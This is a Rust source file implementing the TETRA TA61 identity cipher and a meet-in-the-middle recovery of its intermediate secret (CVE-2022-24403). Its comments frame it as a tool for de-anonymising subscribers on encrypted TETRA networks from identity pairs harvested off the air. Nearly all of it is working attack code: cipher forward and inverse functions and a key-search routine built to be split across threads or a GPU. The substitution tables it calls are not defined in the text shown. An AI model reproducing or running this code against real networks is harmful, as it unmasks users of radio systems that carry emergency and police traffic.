//! TETRA identity de-anonymisation: TA61 and the recovery of its secret.
//!
//! Every enciphered TETRA frame names its destination by a 24-bit Encrypted
//! Short Identity (ESI) rather than the real SSI. TA61 makes the ESI from the
//! SSI and an 80-bit key (SCK class 2, CCK class 3), but the SSI enters only
//! after the key is folded to a 64-bit intermediate `c`, and the fold is the
//! whole of the cipher's strength (CVE-2022-24403). So `c`, not the key, is
//! what a de-anonymiser needs, and `c` falls to a meet-in-the-middle from a
//! few known (SSI, ESI) pairs at 2^40 work: cheap, and cipher-agnostic across
//! TEA set A, so it reads identities on a TEA2/3 network whose voice cannot
//! be decrypted.
//!
//! Ported from the reverse-engineered reference (osmo-tetra `taa1.c`,
//! Apache-lineage), the part the TETRA:BURST paper withheld. The forward and
//! inverse are proven inverses here; there is no independent test vector, so
//! that round trip is the correctness bar until one decrypts real traffic.

/// A 24-bit identity as the three bytes TA61 works on, MSB first.
fn bytes(id: u32) -> [u8; 3] {
    [(id >> 16) as u8, (id >> 8) as u8, id as u8]
}

fn word(b: [u8; 3]) -> u32 {
    (u32::from(b[0]) << 16) | (u32::from(b[1]) << 8) | u32::from(b[2])
}

/// The `trid` permutation: three sbox lookups of a fixed linear mix.
fn trid(inp: [u8; 3]) -> [u8; 3] {
    let (a, b, c) = (inp[0] as u32, inp[1] as u32, inp[2] as u32);
    let i0 = (((b + a) << 1).wrapping_sub(c)) as u8;
    let i1 = (((c + a) << 1).wrapping_sub(b)) as u8;
    let i2 = (((c + b) << 1).wrapping_sub(a)) as u8;
    [SBOX[i0 as usize], SBOX[i1 as usize], SBOX[i2 as usize]]
}

/// The inverse of [`trid`]: inverse sbox, then the inverse linear mix.
fn trid_inv(inp: [u8; 3]) -> [u8; 3] {
    let x = INV_SBOX[inp[0] as usize] as i32;
    let y = INV_SBOX[inp[1] as usize] as i32;
    let z = INV_SBOX[inp[2] as usize] as i32;
    [
        (114 * x + 114 * y - 57 * z) as u8,
        (114 * x - 57 * y + 114 * z) as u8,
        (-57 * x + 114 * y + 114 * z) as u8,
    ]
}

/// Encrypt an SSI to its ESI under the 64-bit intermediate secret `c`: two
/// rounds of key-xor and `trid`, then a final key-xor. Only `c` is needed,
/// not the 80-bit key.
pub fn encrypt_id(c: &[u8; 8], ssi: u32) -> u32 {
    let mut s = bytes(ssi);
    s[0] ^= c[0];
    s[1] ^= c[3];
    s[2] ^= c[6];
    s = trid(s);
    s[0] ^= c[1];
    s[1] ^= c[4];
    s[2] ^= c[7];
    s = trid(s);
    s[0] ^= c[2];
    s[1] ^= c[5];
    s[2] ^= c[0];
    word(s)
}

/// Decrypt an ESI back to its SSI under `c`: the exact inverse of
/// [`encrypt_id`]. This is what turns an encrypted identity on air into the
/// real subscriber, once `c` is known.
pub fn decrypt_id(c: &[u8; 8], esi: u32) -> u32 {
    let mut s = bytes(esi);
    s[0] ^= c[2];
    s[1] ^= c[5];
    s[2] ^= c[0];
    s = trid_inv(s);
    s[0] ^= c[1];
    s[1] ^= c[4];
    s[2] ^= c[7];
    s = trid_inv(s);
    s[0] ^= c[0];
    s[1] ^= c[3];
    s[2] ^= c[6];
    word(s)
}

/// A known plaintext/ciphertext identity pair, as harvested by watching an
/// authentication (SSI in clear) and the enciphered traffic that follows.
#[derive(Clone, Copy, Debug)]
pub struct IdPair {
    pub ssi: u32,
    pub esi: u32,
}

/// Search a slice of the 2^40 meet-in-the-middle space for the intermediate
/// secret `c` consistent with every pair. Needs three or more pairs to leave
/// a single `c`; two leave ~2^16 candidates, one leaves the whole slice.
///
/// The guess `g` packs five bytes `c0,c2,c3,c5,c6`; the other three
/// (`c1,c4,c7`) follow from the first pair, since `trid` is invertible:
/// forward to the midpoint from the SSI, backward to it from the ESI, and
/// their xor is `(c1,c4,c7)`. The caller owns `range` so a 2^40 sweep can be
/// split across threads or handed to the GPU.
pub fn recover_c_range(pairs: &[IdPair], range: core::ops::Range<u64>) -> Vec<[u8; 8]> {
    let mut hits = Vec::new();
    if pairs.len() < 2 {
        return hits;
    }
    let p0 = pairs[0];
    let s0 = bytes(p0.ssi);
    let e0 = bytes(p0.esi);
    for g in range {
        let c0 = g as u8;
        let c2 = (g >> 8) as u8;
        let c3 = (g >> 16) as u8;
        let c5 = (g >> 24) as u8;
        let c6 = (g >> 32) as u8;

        // Forward to the midpoint (after the first trid) from the SSI.
        let p1 = trid([s0[0] ^ c0, s0[1] ^ c3, s0[2] ^ c6]);
        // Backward to the same midpoint from the ESI.
        let e = [e0[0] ^ c2, e0[1] ^ c5, e0[2] ^ c0];
        let p2 = trid_inv(e);
        // The middle-round key is the xor of the two halves.
        let (c1, c4, c7) = (p1[0] ^ p2[0], p1[1] ^ p2[1], p1[2] ^ p2[2]);

        let c = [c0, c1, c2, c3, c4, c5, c6, c7];
        if pairs[1..].iter().all(|p| encrypt_id(&c, p.ssi) == p.esi) {
            hits.push(c);
        }
    }
    hits
}

